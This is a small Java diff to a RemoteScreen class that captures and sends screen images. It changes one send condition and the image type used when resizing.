@@ -96,7 +96,7 @@ public class RemoteScreen {
 	            	
 	            	cou++;
 	               
-	                if (!doit) {
+	                if (doit) {
 	                	Connection.addToSendQueue(packet);
 	                	dos.writeBoolean(false);
 	                	dos.writeInt(x);
@@ -140,7 +140,7 @@ public class RemoteScreen {
 	}
 
 	public static BufferedImage resize(BufferedImage image, int w, int h) {
-		BufferedImage img = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);
+		BufferedImage img = new BufferedImage(w, h, BufferedImage.TYPE_3BYTE_BGR);
 		Graphics2D gr = img.createGraphics();
 		gr.drawImage(image.getScaledInstance(w, h, BufferedImage.SCALE_SMOOTH), 0, 0, w, h, null);
 		gr.dispose();
